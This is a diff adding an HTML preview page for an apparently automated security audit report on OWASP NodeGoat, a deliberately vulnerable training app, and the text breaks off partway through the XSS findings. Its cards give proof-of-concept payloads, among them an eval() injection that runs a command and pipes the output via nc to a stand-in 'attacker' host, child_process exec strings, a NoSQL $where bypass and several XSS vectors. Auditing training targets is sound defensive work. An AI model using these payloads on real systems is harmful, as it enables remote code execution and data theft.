@@ -1,0 +1,475 @@
+<!doctype html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>报告页预览 A — 威胁概览 + 纯卡片流（全量）</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Serif:wght@400;500;600;700&display=swap" rel="stylesheet" />
+<style>
+:root, [data-theme="dark"] {
+  --background: 213 33% 6%; --foreground: 213 22% 82%;
+  --card: 217 26% 11%; --card-fg: 213 22% 82%;
+  --muted: 217 26% 16%; --muted-fg: 213 12% 47%;
+  --border: 217 26% 20%; --border-strong: 217 26% 28%;
+  --primary: 189 94% 53%; --primary-fg: 213 33% 6%;
+  --c-cyan: 189 94% 53%; --c-magenta: 270 100% 80%;
+  --c-yellow: 40 94% 55%; --c-green: 137 55% 52%; --c-red: 0 92% 63%;
+  --font-mono: "IBM Plex Mono", ui-monospace, monospace;
+  --font-sans: "IBM Plex Sans", system-ui, sans-serif;
+  --font-serif: "IBM Plex Serif", Georgia, serif;
+  --radius: 3px; --bg-grid: 213 30% 9%;
+}
+[data-theme="light"] {
+  --background: 0 0% 100%; --foreground: 217 26% 16%;
+  --card: 0 0% 100%; --card-fg: 217 26% 16%;
+  --muted: 220 30% 96%; --muted-fg: 213 12% 47%;
+  --border: 213 25% 88%; --border-strong: 213 25% 78%;
+  --primary: 190 92% 36%; --primary-fg: 0 0% 100%;
+  --c-cyan: 190 92% 36%; --c-magenta: 262 83% 58%;
+  --c-yellow: 38 90% 40%; --c-green: 137 66% 32%; --c-red: 0 73% 51%;
+  --bg-grid: 0 0% 98%;
+}
+* { box-sizing: border-box; }
+body { margin: 0; background: hsl(var(--background)); color: hsl(var(--foreground)); font-family: var(--font-sans); font-size: 14px; line-height: 1.6; -webkit-font-smoothing: antialiased; }
+a { color: hsl(var(--primary)); text-decoration: none; } a:hover { text-decoration: underline; text-underline-offset: 3px; }
+code { font-family: var(--font-mono); }
+
+.topbar { position: sticky; top: 0; z-index: 50; height: 48px; display: flex; align-items: center; gap: 16px; padding: 0 20px; background: hsl(var(--background) / 0.85); backdrop-filter: blur(8px); border-bottom: 1px solid hsl(var(--border)); }
+.brand { display: flex; align-items: center; gap: 8px; font-weight: 700; }
+.brand-mark { width: 18px; height: 18px; background: hsl(var(--primary)); border-radius: 2px; position: relative; }
+.brand-mark::after { content:""; position:absolute; inset:4px; border:1.5px solid hsl(var(--primary-fg)); border-radius:1px; }
+.crumb { color: hsl(var(--muted-fg)); font-size: 12px; } .crumb b { color: hsl(var(--foreground)); font-weight: 500; }
+.topbar .spacer { flex: 1; }
+.theme-btn { font-family: var(--font-mono); font-size: 11px; color: hsl(var(--muted-fg)); background: hsl(var(--muted)); border: 1px solid hsl(var(--border)); padding: 5px 10px; border-radius: var(--radius); cursor: pointer; }
+.theme-btn:hover { color: hsl(var(--foreground)); }
+
+.shell { max-width: 1240px; margin: 0 auto; padding: 24px 24px 120px; }
+
+/* ===== 威胁概览条 ===== */
+.threat { display: grid; grid-template-columns: 200px 1fr 280px; gap: 0; border: 1px solid hsl(var(--border-strong)); border-radius: var(--radius); background: linear-gradient(hsl(var(--card)), hsl(var(--card))), repeating-linear-gradient(0deg, transparent 0 23px, hsl(var(--bg-grid)) 23px 24px), repeating-linear-gradient(90deg, transparent 0 23px, hsl(var(--bg-grid)) 23px 24px); overflow: hidden; }
+.threat > div { padding: 18px 20px; } .threat > div + div { border-left: 1px solid hsl(var(--border)); }
+.threat__total { display: flex; flex-direction: column; justify-content: center; }
+.threat__num { font-family: var(--font-serif); font-size: 52px; font-weight: 700; line-height: 1; letter-spacing: -0.02em; }
+.threat__numlbl { font-family: var(--font-mono); font-size: 11px; color: hsl(var(--muted-fg)); margin-top: 6px; text-transform: uppercase; letter-spacing: 0.08em; }
+.threat__sub { margin-top: 10px; font-size: 12px; } .threat__sub b { color: hsl(var(--primary)); font-family: var(--font-mono); }
+.threat__bar { display: flex; flex-direction: column; justify-content: center; }
+.threat__barlabel { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 10px; }
+.threat__barlabel span { font-family: var(--font-mono); font-size: 11px; color: hsl(var(--muted-fg)); text-transform: uppercase; letter-spacing: 0.08em; }
+.threat__stack { display: flex; height: 36px; border-radius: 2px; overflow: hidden; border: 1px solid hsl(var(--border)); }
+.threat__seg { display: flex; align-items: center; justify-content: center; font-family: var(--font-mono); font-size: 12px; font-weight: 600; color: hsl(var(--background)); min-width: 0; }
+.threat__seg[data-t="inj"] { background: hsl(var(--c-cyan)); } .threat__seg[data-t="xss"] { background: hsl(var(--c-magenta)); } .threat__seg[data-t="auth"] { background: hsl(var(--c-yellow)); } .threat__seg[data-t="authz"] { background: hsl(var(--c-green)); } .threat__seg[data-t="ssrf"] { background: hsl(var(--c-red)); color: #fff; }
+.threat__legend { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; margin-top: 12px; }
+.threat__lg { font-family: var(--font-mono); font-size: 10.5px; color: hsl(var(--muted-fg)); display: flex; align-items: center; gap: 5px; }
+.threat__lg i { width: 8px; height: 8px; border-radius: 1px; } .threat__lg b { color: hsl(var(--foreground)); font-weight: 500; }
+.threat__top { display: flex; flex-direction: column; gap: 7px; }
+.threat__toplabel { font-family: var(--font-mono); font-size: 10.5px; color: hsl(var(--c-red)); text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 2px; }
+.threat__risk { display: flex; align-items: center; gap: 8px; font-size: 12.5px; }
+.threat__risk .vid { font-family: var(--font-mono); font-size: 11px; padding: 2px 6px; border-radius: 2px; background: hsl(var(--c-red) / 0.12); color: hsl(var(--c-red)); border: 1px solid hsl(var(--c-red) / 0.3); white-space: nowrap; }
+
+/* ===== 章节标题 ===== */
+.h-sec { display: flex; align-items: center; gap: 10px; margin: 44px 0 4px; scroll-margin-top: 64px; }
+.h-sec h2 { font-family: var(--font-serif); font-size: 20px; font-weight: 600; margin: 0; letter-spacing: -0.01em; }
+.h-sec .tag { font-family: var(--font-mono); font-size: 11px; color: hsl(var(--muted-fg)); }
+.h-sec::after { content: ""; flex: 1; height: 1px; background: hsl(var(--border)); }
+.sec-root { font-size: 12.5px; color: hsl(var(--foreground) / 0.8); margin: 6px 0 16px; line-height: 1.55; }
+.sec-root b { color: hsl(var(--foreground)); }
+.sec-root code { font-family: var(--font-mono); font-size: 11.5px; background: hsl(var(--muted)); padding: 1px 5px; border-radius: 2px; color: hsl(var(--primary)); }
+
+/* ===== 执行摘要 hero ===== */
+.hero { border: 1px solid hsl(var(--border)); border-left: 2px solid hsl(var(--primary)); border-radius: var(--radius); background: hsl(var(--card)); overflow: hidden; margin-top: 16px; }
+.hero__head { display: flex; align-items: center; justify-content: space-between; padding: 14px 18px; border-bottom: 1px solid hsl(var(--border)); }
+.hero__head h3 { margin: 0; font-family: var(--font-serif); font-size: 15px; font-weight: 600; }
+.hero__toggle { font-family: var(--font-mono); font-size: 11px; color: hsl(var(--muted-fg)); background: none; border: 1px solid hsl(var(--border)); padding: 4px 9px; border-radius: var(--radius); cursor: pointer; }
+.hero__body { padding: 8px 18px 14px; }
+.hero__ol { list-style: none; counter-reset: risk; padding: 0; margin: 0; }
+.hero__ol li { counter-increment: risk; display: grid; grid-template-columns: 28px auto 1fr; gap: 10px; padding: 10px 0; border-bottom: 1px dashed hsl(var(--border)); align-items: baseline; }
+.hero__ol li:last-child { border-bottom: none; }
+.hero__ol li::before { content: counter(risk, decimal-leading-zero); font-family: var(--font-mono); font-size: 12px; color: hsl(var(--muted-fg)); }
+.hero__ol .desc { font-size: 13.5px; line-height: 1.55; }
+
+/* ===== 类型汇总卡 ===== */
+.types { display: grid; grid-template-columns: repeat(5, 1fr); gap: 12px; margin-top: 16px; }
+.typecard { border: 1px solid hsl(var(--border)); border-radius: var(--radius); background: hsl(var(--card)); padding: 14px; position: relative; overflow: hidden; }
+.typecard::before { content: ""; position: absolute; top: 0; left: 0; right: 0; height: 2px; }
+.typecard[data-t="inj"]::before { background: hsl(var(--c-cyan)); } .typecard[data-t="xss"]::before { background: hsl(var(--c-magenta)); } .typecard[data-t="auth"]::before { background: hsl(var(--c-yellow)); } .typecard[data-t="authz"]::before { background: hsl(var(--c-green)); } .typecard[data-t="ssrf"]::before { background: hsl(var(--c-red)); }
+.typecard__name { font-family: var(--font-mono); font-size: 11px; text-transform: uppercase; letter-spacing: 0.08em; color: hsl(var(--muted-fg)); }
+.typecard__count { font-family: var(--font-serif); font-size: 34px; font-weight: 700; line-height: 1.05; margin: 6px 0 2px; letter-spacing: -0.02em; }
+.typecard[data-t="inj"] .typecard__count { color: hsl(var(--c-cyan)); } .typecard[data-t="xss"] .typecard__count { color: hsl(var(--c-magenta)); } .typecard[data-t="auth"] .typecard__count { color: hsl(var(--c-yellow)); } .typecard[data-t="authz"] .typecard__count { color: hsl(var(--c-green)); } .typecard[data-t="ssrf"] .typecard__count { color: hsl(var(--c-red)); }
+.typecard__range { font-family: var(--font-mono); font-size: 10.5px; color: hsl(var(--muted-fg)); margin-bottom: 8px; }
+.typecard__findings { font-size: 11.5px; line-height: 1.5; color: hsl(var(--foreground) / 0.85); border-top: 1px dashed hsl(var(--border)); padding-top: 8px; }
+
+/* ===== 漏洞卡片（纯卡片流，头部信号做足以替代表格扫读） ===== */
+.cards-label { font-family: var(--font-mono); font-size: 11px; color: hsl(var(--muted-fg)); text-transform: uppercase; letter-spacing: 0.08em; margin: 14px 0 10px; }
+.cards-label .cnt { color: hsl(var(--foreground)); }
+.vuln-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+.vuln { display: grid; grid-template-columns: 3px 1fr; border: 1px solid hsl(var(--border)); border-radius: var(--radius); background: hsl(var(--card)); overflow: hidden; }
+.vuln[data-t="inj"] .vuln__stripe { background: hsl(var(--c-cyan)); } .vuln[data-t="xss"] .vuln__stripe { background: hsl(var(--c-magenta)); } .vuln[data-t="auth"] .vuln__stripe { background: hsl(var(--c-yellow)); } .vuln[data-t="authz"] .vuln__stripe { background: hsl(var(--c-green)); } .vuln[data-t="ssrf"] .vuln__stripe { background: hsl(var(--c-red)); }
+.vuln__body { padding: 11px 14px; }
+.vuln__head { display: flex; align-items: center; gap: 6px; flex-wrap: wrap; margin-bottom: 5px; }
+.vid { font-family: var(--font-mono); font-size: 11px; font-weight: 600; padding: 2px 6px; border-radius: 2px; }
+.vuln[data-t="inj"] .vid { color: hsl(var(--c-cyan)); background: hsl(var(--c-cyan) / 0.12); border: 1px solid hsl(var(--c-cyan) / 0.3); }
+.vuln[data-t="xss"] .vid { color: hsl(var(--c-magenta)); background: hsl(var(--c-magenta) / 0.12); border: 1px solid hsl(var(--c-magenta) / 0.3); }
+.vuln[data-t="auth"] .vid { color: hsl(var(--c-yellow)); background: hsl(var(--c-yellow) / 0.14); border: 1px solid hsl(var(--c-yellow) / 0.35); }
+.vuln[data-t="authz"] .vid { color: hsl(var(--c-green)); background: hsl(var(--c-green) / 0.12); border: 1px solid hsl(var(--c-green) / 0.3); }
+.vuln[data-t="ssrf"] .vid { color: hsl(var(--c-red)); background: hsl(var(--c-red) / 0.12); border: 1px solid hsl(var(--c-red) / 0.3); }
+.chip { font-family: var(--font-mono); font-size: 10px; padding: 1px 5px; border-radius: 2px; background: hsl(var(--muted)); color: hsl(var(--muted-fg)); border: 1px solid hsl(var(--border)); white-space: nowrap; }
+.chip--star { color: hsl(var(--c-red)); border-color: hsl(var(--c-red) / 0.4); background: hsl(var(--c-red) / 0.08); }
+.chip--warn { color: hsl(var(--c-yellow)); border-color: hsl(var(--c-yellow) / 0.4); background: hsl(var(--c-yellow) / 0.1); }
+.meta { display: inline-flex; align-items: center; gap: 3px; font-family: var(--font-mono); font-size: 10.5px; color: hsl(var(--muted-fg)); white-space: nowrap; }
+.meta--pub { color: hsl(var(--c-cyan)); }
+.conf { margin-left: auto; font-family: var(--font-mono); font-size: 10px; color: hsl(var(--muted-fg)); } .conf::before { content: "conf "; opacity: 0.6; } .conf b { color: hsl(var(--foreground)); font-weight: 500; }
+.vuln h3 { margin: 4px 0 8px; font-family: var(--font-sans); font-size: 13.5px; font-weight: 600; line-height: 1.4; }
+.kv { display: grid; grid-template-columns: 72px 1fr; gap: 4px 10px; font-size: 12px; }
+.kv dt { font-family: var(--font-mono); font-size: 10px; color: hsl(var(--muted-fg)); text-transform: uppercase; letter-spacing: 0.04em; padding-top: 1px; }
+.kv dd { margin: 0; line-height: 1.45; }
+.kv dd code, .vuln code { font-size: 11px; background: hsl(var(--muted)); padding: 1px 4px; border-radius: 2px; color: hsl(var(--primary)); }
+.poc { margin-top: 8px; }
+.poc summary { cursor: pointer; font-family: var(--font-mono); font-size: 10.5px; color: hsl(var(--muted-fg)); list-style: none; display: inline-flex; align-items: center; gap: 4px; border: 1px dashed hsl(var(--border)); padding: 2px 7px; border-radius: 2px; }
+.poc summary::before { content: "▸"; } .poc[open] summary::before { content: "▾"; }
+.poc summary:hover { color: hsl(var(--foreground)); border-color: hsl(var(--border-strong)); }
+.poc pre { margin: 6px 0 0; background: hsl(var(--background)); border: 1px solid hsl(var(--border)); border-left: 2px solid hsl(var(--c-red) / 0.6); border-radius: var(--radius); padding: 8px 10px; font-size: 11px; color: hsl(var(--c-green)); overflow-x: auto; }
+@media (max-width: 900px) {
+  .threat { grid-template-columns: 1fr; } .threat > div + div { border-left: none; border-top: 1px solid hsl(var(--border)); }
+  .types { grid-template-columns: repeat(2, 1fr); }
+  .vuln-grid { grid-template-columns: 1fr; }
+  .kv { grid-template-columns: 1fr; } .kv dt { padding-top: 0; }
+}
+</style>
+</head>
+<body>
+<header class="topbar">
+  <span class="brand"><span class="brand-mark"></span>SHANNON</span>
+  <span class="crumb">workspaces / <b>NodeGoat_20260630-002707</b> / 报告</span>
+  <span class="spacer"></span>
+  <button class="theme-btn" onclick="toggleTheme()">◐ theme: dark</button>
+</header>
+
+<main class="shell">
+
+  <!-- ===== 威胁概览条 ===== -->
+  <section class="threat" aria-label="威胁概览">
+    <div class="threat__total">
+      <div class="threat__num">36</div>
+      <div class="threat__numlbl">已确认漏洞 · 5 类</div>
+      <div class="threat__sub">公网可达 <b>34</b> · pre-auth <b>8</b></div>
+    </div>
+    <div class="threat__bar">
+      <div class="threat__barlabel"><span>按类型分布</span><span>36 total</span></div>
+      <div class="threat__stack">
+        <div class="threat__seg" data-t="inj"   style="flex:4"  title="Injection 4">4</div>
+        <div class="threat__seg" data-t="xss"   style="flex:13" title="XSS 13">13</div>
+        <div class="threat__seg" data-t="auth"  style="flex:10" title="Auth 10">10</div>
+        <div class="threat__seg" data-t="authz" style="flex:7"  title="Authz 7">7</div>
+        <div class="threat__seg" data-t="ssrf"  style="flex:2"  title="SSRF 2">2</div>
+      </div>
+      <div class="threat__legend">
+        <span class="threat__lg"><i style="background:hsl(var(--c-cyan))"></i>Inj <b>4</b></span>
+        <span class="threat__lg"><i style="background:hsl(var(--c-magenta))"></i>XSS <b>13</b></span>
+        <span class="threat__lg"><i style="background:hsl(var(--c-yellow))"></i>Auth <b>10</b></span>
+        <span class="threat__lg"><i style="background:hsl(var(--c-green))"></i>Authz <b>7</b></span>
+        <span class="threat__lg"><i style="background:hsl(var(--c-red))"></i>SSRF <b>2</b></span>
+      </div>
+    </div>
+    <div class="threat__top">
+      <div class="threat__toplabel">⚡ 建议优先处置</div>
+      <div class="threat__risk"><span class="vid">INJ-VULN-01</span><span>服务端 RCE · <code>eval()</code> 直达</span></div>
+      <div class="threat__risk"><span class="vid">SSRF-VULN-01</span><span>完整响应 SSRF · 可打 IMDS</span></div>
+      <div class="threat__risk"><span class="vid">AUTH-VULN-08</span><span>硬编码 admin 凭据接管</span></div>
+    </div>
+  </section>
+
+  <!-- ===== 执行摘要 hero ===== -->
+  <div class="h-sec" id="summary"><h2>执行摘要</h2><span class="tag">最高风险发现 · 按业务影响排序</span></div>
+  <section class="hero">
+    <div class="hero__head">
+      <h3>OWASP NodeGoat v1.3.0 · 全部网络可达攻击面系统性白盒审计</h3>
+      <button class="hero__toggle" onclick="const b=this.closest('.hero').querySelector('.hero__body'); b.hidden=!b.hidden">折叠 ▾</button>
+    </div>
+    <div class="hero__body">
+      <ol class="hero__ol">
+        <li><span class="vid" style="color:hsl(var(--c-cyan));background:hsl(var(--c-cyan)/0.12);border:1px solid hsl(var(--c-cyan)/0.3)">INJ-VULN-01/02/03</span><span class="desc"><b>服务端 RCE</b>：<code>POST /contributions</code> 的 <code>preTax/afterTax/roth</code> 直达 <code>eval()</code>，可执行系统命令；仅需任一登录态。</span></li>
+        <li><span class="vid" style="color:hsl(var(--c-red));background:hsl(var(--c-red)/0.12);border:1px solid hsl(var(--c-red)/0.3)">SSRF-VULN-01</span><span class="desc"><b>完整响应 SSRF</b>：<code>GET /research</code> 将 <code>req.query.url</code> 拼接后出站并回写完整响应体，可命中 AWS IMDS / loopback / 内网。</span></li>
+        <li><span class="vid" style="color:hsl(var(--c-yellow));background:hsl(var(--c-yellow)/0.14);border:1px solid hsl(var(--c-yellow)/0.35)">AUTH-VULN-08</span><span class="desc"><b>管理员账户接管</b>：硬编码默认凭据 <code>admin/Admin_123</code> 每次容器启动重灌。</span></li>
+        <li><span class="vid" style="color:hsl(var(--c-magenta));background:hsl(var(--c-magenta)/0.12);border:1px solid hsl(var(--c-magenta)/0.3)">XSS-VULN-04</span><span class="desc"><b>经公开注册对 admin 的存储型 XSS</b>：admin 查看 <code>/benefits</code> 即触发；叠加 <code>csurf</code> 全局禁用，可链 XSS→CSRF。</span></li>
+        <li><span class="vid" style="color:hsl(var(--c-green));background:hsl(var(--c-green)/0.12);border:1px solid hsl(var(--c-green)/0.3)">AUTHZ-VULN-01/03/06</span><span class="desc"><b>横向/纵向越权</b>：<code>/allocations/:userId</code> 与 <code>POST /benefits</code> 的 <code>userId</code> 取自 params/body 而非 session。</span></li>
+      </ol>
+    </div>
+  </section>
+
+  <!-- ===== 类型汇总 ===== -->
+  <div class="h-sec"><h2>按漏洞类型汇总</h2><span class="tag">5 categories</span></div>
+  <section class="types">
+    <article class="typecard" data-t="inj"><div class="typecard__name">Injection</div><div class="typecard__count">4</div><div class="typecard__range">Critical ~ High</div><div class="typecard__findings">3 条 SSJS/命令注入 RCE + 1 条 NoSQL <code>$where</code>，全部仅需 isLoggedIn。</div></article>
+    <article class="typecard" data-t="xss"><div class="typecard__name">XSS</div><div class="typecard__count">13</div><div class="typecard__range">High ~ Low</div><div class="typecard__findings">3 pre-auth 反射 + 多个存储型；根因 Swig <code>autoescape:false</code>。</div></article>
+    <article class="typecard" data-t="auth"><div class="typecard__name">Auth</div><div class="typecard__count">10</div><div class="typecard__range">High ~ Medium · 8H/2M</div><div class="typecard__findings">会话生命周期失控 + 凭据策略失守 + 缺失 abuse 防御。</div></article>
+    <article class="typecard" data-t="authz"><div class="typecard__name">Authz</div><div class="typecard__count">7</div><div class="typecard__range">High</div><div class="typecard__findings">水平 IDOR + 垂直越权 + CSRF 全局禁用。</div></article>
+    <article class="typecard" data-t="ssrf"><div class="typecard__name">SSRF</div><div class="typecard__count">2</div><div class="typecard__range">Critical ~ High</div><div class="typecard__findings"><code>/research</code> 完整响应 SSRF + <code>/learn</code> 开放重定向。</div></article>
+  </section>
+
+  <!-- ============ INJECTION ============ -->
+  <div class="h-sec" id="inj"><h2>注入分析报告</h2><span class="tag">4 findings</span></div>
+  <p class="sec-root"><b>根因：</b>3 条 SSJS/命令注入（RCE）—— <code>POST /contributions</code> 的 <code>preTax/afterTax/roth</code> 各自直达独立的 <code>eval()</code>；1 条 NoSQL <code>$where</code> 注入。全部仅需 <code>isLoggedIn</code>，活动代码零净化。</p>
+  <div class="cards-label">全量 <span class="cnt">4 / 4</span></div>
+  <div class="vuln-grid">
+    <article class="vuln" data-t="inj" id="inj-01"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">INJ-VULN-01</span><span class="chip chip--star">★ 首要目标</span><span class="chip">RCE</span><span class="meta meta--pub">🌐 公网</span><span class="meta">isLoggedIn</span><span class="conf"><b>high</b></span></div>
+      <h3>SSJS 命令注入 — <code>preTax</code> 直达 <code>eval()</code></h3>
+      <dl class="kv"><dt>source</dt><dd><code>POST /contributions</code> body <code>preTax</code></dd><dt>sink</dt><dd><code>eval()</code> @ contributions.js:32</dd><dt>encoding</dt><dd>None · 零净化</dd></dl>
+      <details class="poc"><summary>witness</summary><pre>"require('child_process').exec('id | nc attacker 4444')"</pre></details>
+    </div></article>
+    <article class="vuln" data-t="inj" id="inj-02"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">INJ-VULN-02</span><span class="chip">RCE</span><span class="meta meta--pub">🌐 公网</span><span class="meta">isLoggedIn</span><span class="conf"><b>high</b></span></div>
+      <h3>SSJS 命令注入 — <code>afterTax</code> 直达 <code>eval()</code></h3>
+      <dl class="kv"><dt>source</dt><dd><code>POST /contributions</code> body <code>afterTax</code></dd><dt>sink</dt><dd><code>eval()</code> @ contributions.js:33</dd><dt>encoding</dt><dd>None</dd></dl>
+      <details class="poc"><summary>witness</summary><pre>"require('child_process').exec('id')"</pre></details>
+    </div></article>
+    <article class="vuln" data-t="inj" id="inj-03"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">INJ-VULN-03</span><span class="chip">RCE</span><span class="meta meta--pub">🌐 公网</span><span class="meta">isLoggedIn</span><span class="conf"><b>high</b></span></div>
+      <h3>SSJS 命令注入 — <code>roth</code> 直达 <code>eval()</code></h3>
+      <dl class="kv"><dt>source</dt><dd><code>POST /contributions</code> body <code>roth</code></dd><dt>sink</dt><dd><code>eval()</code> @ contributions.js:34</dd><dt>encoding</dt><dd>None</dd></dl>
+      <details class="poc"><summary>witness</summary><pre>"require('child_process').exec('id')"</pre></details>
+    </div></article>
+    <article class="vuln" data-t="inj" id="inj-04"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">INJ-VULN-04</span><span class="chip">SQLi</span><span class="meta meta--pub">🌐 公网</span><span class="meta">isLoggedIn</span><span class="conf"><b>high</b></span></div>
+      <h3>NoSQL 注入 — <code>threshold</code> 拼进 <code>$where</code></h3>
+      <dl class="kv"><dt>source</dt><dd><code>GET /allocations/:userId</code> query <code>threshold</code></dd><dt>sink</dt><dd><code>$where</code> JS 表达式 @ allocations-dao.js:78</dd><dt>impact</dt><dd>dump 全表 allocations</dd></dl>
+      <details class="poc"><summary>witness</summary><pre>?threshold=1;return true; //</pre></details>
+    </div></article>
+  </div>
+
+  <!-- ============ XSS ============ -->
+  <div class="h-sec" id="xss"><h2>XSS 分析报告</h2><span class="tag">13 findings</span></div>
+  <p class="sec-root"><b>根因：</b>Swig <code>autoescape:false</code> 全局关闭，致 13 个 sink。3 个 pre-auth 反射型；多个存储型，首要为经公开注册对 admin 投毒。memo 经 <code>marked()</code> 的 sink 因 <code>sanitize:true</code> 实测部分有效。</p>
+  <div class="cards-label">全量 <span class="cnt">13 / 13</span></div>
+  <div class="vuln-grid">
+    <article class="vuln" data-t="xss" id="xss-01"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">XSS-VULN-01</span><span class="chip chip--star">★ 首破点</span><span class="chip">Reflected</span><span class="meta meta--pub">🌐 pre-auth</span><span class="conf"><b>high</b></span></div>
+      <h3>login userName 属性回显</h3>
+      <dl class="kv"><dt>source</dt><dd><code>POST /login</code> body <code>userName</code></dd><dt>sink</dt><dd>login.html:110 <code>value=""</code></dd><dt>ctx</dt><dd>HTML_ATTRIBUTE · 引号突围</dd></dl>
+      <details class="poc"><summary>witness</summary><pre>" autofocus onfocus="alert(document.domain)</pre></details>
+    </div></article>
+    <article class="vuln" data-t="xss" id="xss-02"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">XSS-VULN-02</span><span class="chip">Reflected</span><span class="meta meta--pub">🌐 pre-auth</span><span class="conf"><b>high</b></span></div>
+      <h3>signup userName 属性回显</h3>
+      <dl class="kv"><dt>source</dt><dd><code>POST /signup</code> body <code>userName</code></dd><dt>sink</dt><dd>signup.html:75 <code>value=""</code></dd><dt>limit</dt><dd><code>USER_RE=/^.{1,20}$/</code></dd></dl>
+      <details class="poc"><summary>witness</summary><pre>" autofocus onfocus="alert(1) a</pre></details>
+    </div></article>
+    <article class="vuln" data-t="xss" id="xss-03"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">XSS-VULN-03</span><span class="chip">Reflected</span><span class="meta meta--pub">🌐 pre-auth</span><span class="conf"><b>high</b></span></div>
+      <h3>signup email 属性回显</h3>
+      <dl class="kv"><dt>source</dt><dd><code>POST /signup</code> body <code>email</code></dd><dt>sink</dt><dd>signup.html:102 <code>value=""</code></dd><dt>ctx</dt><dd>HTML_ATTRIBUTE</dd></dl>
+      <details class="poc"><summary>witness</summary><pre>" autofocus onfocus="alert(document.domain)</pre></details>
+    </div></article>
+    <article class="vuln" data-t="xss" id="xss-04"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">XSS-VULN-04</span><span class="chip chip--star">★ 首要目标</span><span class="chip">Stored</span><span class="meta meta--pub">🌐 注入公开</span><span class="meta">admin 渲染</span><span class="conf"><b>high</b></span></div>
+      <h3>经公开注册对 admin 投毒，benefits 名称</h3>
+      <dl class="kv"><dt>source</dt><dd><code>POST /signup</code> body <code>firstName/lastName</code></dd><dt>sink</dt><dd>benefits.html:51 <code>{{user.firstName}}</code></dd><dt>chain</dt><dd>XSS→CSRF→IDOR/RCE</dd></dl>
+      <details class="poc"><summary>witness</summary><pre>&lt;img src=x onerror=alert(1)&gt;</pre></details>
+    </div></article>
+    <article class="vuln" data-t="xss" id="xss-05"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">XSS-VULN-05</span><span class="chip chip--warn">⚠ 可执行性受限</span><span class="chip">Stored</span><span class="meta">🔐 auth</span><span class="conf"><b>low</b></span></div>
+      <h3>memo 经 <code>marked()</code>，sanitize 部分有效</h3>
+      <dl class="kv"><dt>sink</dt><dd>memos.html:31 <code>{{ marked(doc.memo) }}</code></dd><dt>encoding</dt><dd><code>sanitize:true</code> 阻裸 HTML</dd><dt>notes</dt><dd>memos 全局共享，admin 查看即触发</dd></dl>
+      <details class="poc"><summary>witness</summary><pre>// marked 0.3.5 sanitize 绕过向量 ↘
+// 裸 &lt;img onerror&gt; 被转义，需实测运行时</pre></details>
+    </div></article>
+    <article class="vuln" data-t="xss" id="xss-06"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">XSS-VULN-06</span><span class="chip">Stored</span><span class="meta">🔐 auth</span><span class="meta meta--pub">🌐 IDOR</span><span class="conf"><b>med</b></span></div>
+      <h3>benefitStartDate → benefits 属性回显</h3>
+      <dl class="kv"><dt>source</dt><dd><code>POST /benefits</code> body <code>benefitStartDate</code></dd><dt>sink</dt><dd>benefits.html:57 <code>value=""</code></dd><dt>ctx</dt><dd>HTML_ATTRIBUTE · date 类型</dd></dl>
+      <details class="poc"><summary>witness</summary><pre>" onfocus="alert(1)</pre></details>
+    </div></article>
+    <article class="vuln" data-t="xss" id="xss-07"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">XSS-VULN-07</span><span class="chip">Stored</span><span class="meta meta--pub">🌐 注入公开</span><span class="meta">跨页自感染</span><span class="conf"><b>high</b></span></div>
+      <h3>firstName/lastName → layout 顶栏</h3>
+      <dl class="kv"><dt>sink</dt><dd>layout.html:75 <code>{{firstName}}</code></dd><dt>pages</dt><dd>/, /dashboard, /profile, /contributions, /memos, /research</dd><dt>encoding</dt><dd>None</dd></dl>
+      <details class="poc"><summary>witness</summary><pre>&lt;img src=x onerror=alert(1)&gt;</pre></details>
+    </div></article>
+    <article class="vuln" data-t="xss" id="xss-08"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">XSS-VULN-08</span><span class="chip">Stored</span><span class="meta meta--pub">🌐 注入公开</span><span class="meta">跨用户</span><span class="conf"><b>high</b></span></div>
+      <h3>firstName/lastName → allocations（跨用户）</h3>
+      <dl class="kv"><dt>sink</dt><dd>allocations.html:35 <code>{{allocation.firstName}}</code></dd><dt>path</dt><dd>经 <code>$where</code> 查询返回跨用户行</dd><dt>encoding</dt><dd>None</dd></dl>
+      <details class="poc"><summary>witness</summary><pre>&lt;img src=x onerror=alert(1)&gt;</pre></details>
+    </div></article>
+    <article class="vuln" data-t="xss" id="xss-09"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">XSS-VULN-09</span><span class="chip chip--star">★ profile 最危险</span><span class="chip">Reflected</span><span class="meta">🔐 auth</span><span class="conf"><b>high</b></span></div>
+      <h3>profile <code>firstNameSafeString</code> 命名陷阱 · URL/href sink</h3>
+      <dl class="kv"><dt>source</dt><dd><code>POST /profile</code> body <code>firstName</code></dd><dt>sink</dt><dd>profile.html:78 <code>&lt;a href=""&gt;</code></dd><dt>trap</dt><dd>变量名暗示"已安全化"实则零编码</dd></dl>
+      <details class="poc"><summary>witness</summary><pre>javascript:alert(1)   // POST firstName + 触发 bankRouting 校验失败</pre></details>
+    </div></article>
+    <article class="vuln" data-t="xss" id="xss-10"><div class="vuln__stripe"></div><div class="vuln__body">
